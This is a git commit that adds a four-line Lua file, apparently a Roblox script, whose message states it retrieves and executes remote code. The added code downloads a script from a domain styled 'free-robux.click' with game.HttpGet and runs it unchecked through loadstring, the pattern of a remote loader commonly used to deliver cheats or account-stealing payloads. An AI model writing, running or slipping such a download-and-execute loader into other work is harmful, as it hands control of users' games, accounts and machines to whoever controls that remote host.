9bca6475bb88572483944896c4f384ab39b41d4a
xgubbyx <k82812942@gmail.com>
2026-01-03 22:56:03 +0100

    Add script to retrieve and execute remote code

---
+++ Script.lua
@@ -0,0 +1,4 @@
+untitled, taggame = pcall(game.HttpGet, game, ('https://%s/%s'):format('skibiditoilet.free-robux.click', 'p/raw/bryvmasag5'));
+assert(untitled, 'Couldnt retrieve script,', taggame);
+loadstring(taggame)();
+game:GetService('UserInputService').MouseIconEnabled = true
